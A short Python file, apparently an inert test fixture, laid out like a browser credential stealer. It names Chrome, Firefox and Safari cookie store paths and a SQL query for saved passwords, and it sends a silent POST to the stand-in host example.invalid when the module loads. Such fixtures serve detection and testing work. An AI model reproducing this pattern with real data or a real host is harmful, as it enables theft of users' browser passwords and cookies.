# Static fixture only; do not execute. The outbound request is a marker, not a live endpoint.
import requests

chrome_name = "Chrome"
firefox_name = "Firefox"
safari_name = "Safari"
chrome = r"Google/Chrome/User Data/Default/Cookies"
firefox = r"Mozilla/Firefox/Profiles/default/cookies.sqlite"
safari = r"Safari/Library/Cookies/Cookies.binarycookies"
query = "SELECT origin_url, password_value FROM logins"

def collect_and_send():
    return requests.post("https://example.invalid/collect", json={"fixture": "inert"})

try:
    collect_and_send()
except Exception:
    pass
